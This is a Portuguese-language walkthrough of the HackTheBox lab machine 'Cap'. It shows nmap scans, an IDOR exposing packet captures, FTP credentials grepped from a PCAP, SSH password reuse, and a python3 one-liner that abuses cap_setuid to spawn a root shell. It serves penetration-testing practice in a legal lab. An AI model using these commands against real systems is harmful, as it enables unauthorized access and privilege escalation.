---
title: "Cap - HTB (Linux | Easy)"
published: 2026-02-21
description: "Walkthrough da máquina Cap do HackTheBox, explorando IDOR, análise de PCAP e Linux Capabilities."
image: "https://miro.medium.com/v2/resize:fit:1200/1*Wr0b2lgoRbznCjM9CqQH2g.png"
tags: ["hackthebox", "ctf", "walkthrough", "linux", "idor", "pcap", "capabilities", "python"]
category: "HackTheBox"
draft: false
---

# 🏴 Cap - HTB (Linux | Easy)

:::note
**Resumo da Máquina**
- **IP:** `10.129.2.2`
- **SO:** Linux (Ubuntu 20.04.2 LTS)
- **Vetor de Ataque:** IDOR em dashboard web, captura de pacotes (PCAP) com credenciais em texto claro e escalação de privilégios via Linux Capabilities (cap_setuid).
:::

**Tags:** `#htb` `#linux` `#idor` `#pcap` `#capabilities` `#python`

## 🛠️ Ferramentas Utilizadas
- nmap
- firefox
- strings
- tcpdump
- ssh
- getcap
- python3

## 🔍 Fase 1: Reconhecimento

### Nmap - Scan Inicial
```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.2.2
```

### Nmap - Scan Completo
```bash
nmap -p- --min-rate 5000 -oN nmap_full.txt 10.129.2.2
```

- **Porta 21:** FTP (`vsftpd 3.0.3`)
- **Porta 22:** SSH (`OpenSSH 8.2p1`)
- **Porta 80:** HTTP (`gunicorn`)

## 🌐 Fase 2: Enumeração Web

A aplicação web é um dashboard de monitoramento. Ao explorar a funcionalidade "Security Snapshot", notamos que os IDs na URL são sequenciais e podem ser manipulados.

### Descobrindo IDOR
Navegando pelos snapshots:
```
http://10.129.2.2/data/1
http://10.129.2.2/data/2
```

O ID `0` estava acessível e continha dados de outro usuário:
```
http://10.129.2.2/data/0
```

:::tip
A vulnerabilidade permitiu acessar capturas de pacotes (PCAP) do sistema.
:::

## 📦 Fase 3: Análise do PCAP

Baixamos o arquivo `0.pcap` e analisamos em busca de credenciais transmitidas em protocolos não criptografados (como o FTP encontrado no scan).

### Extraindo Credenciais
```bash
strings 0.pcap | grep -iE "USER|PASS"
```

```text
USER nathan
PASS Buck3tH4TF0RM3!
```

Confirmando com `tcpdump`:
```bash
tcpdump -r 0.pcap -A port 21 2>/dev/null | grep -iE "USER|PASS"
```

## 🔐 Fase 4: Acesso Inicial (Password Reuse)

As credenciais do FTP funcionam para o acesso SSH do usuário nathan.
```bash
ssh nathan@10.129.2.2
```

**USER FLAG PWNED 🎉**

## ⬆️ Fase 5: Escalação de Privilégios

Enumerando capabilities binárias no sistema:
```bash
getcap -r / 2>/dev/null
```

Encontramos o binário do Python com a capability `cap_setuid`:
```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### Explorando cap_setuid
Utilizamos o Python para alterar o UID para 0 (root) e lançar um shell:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**ROOT FLAG PWNED 👑**

## 🗺️ Attack Path

```text
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  Nmap Scan                                               │
│  └── Portas 21 (FTP), 22 (SSH), 80 (HTTP)               │
│       │                                                  │
│       ▼                                                  │
│  Web Enumeration (IDOR)                                  │
│  └── Acesso a capturas de pacotes em /data/0             │
│       │                                                  │
│       ▼                                                  │
│  PCAP Analysis                                           │
│  └── Credenciais FTP (nathan : Buck3tH4TF0RM3!)          │
│       │                                                  │
│       ▼                                                  │
│  SSH Login (Password Reuse)                              │
│  └── nathan@cap                                          │
│       │                                                  │
│       ▼                                                  │
│  Privilege Escalation                                    │
│  └── getcap → python3.8 (cap_setuid)                     │
│       │                                                  │
│       ▼                                                  │
│  ROOT ACCESS! 🏆                                         │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---
**Autor:** felps
**Data:** 21/02/2026
**Plataforma:** HackTheBox
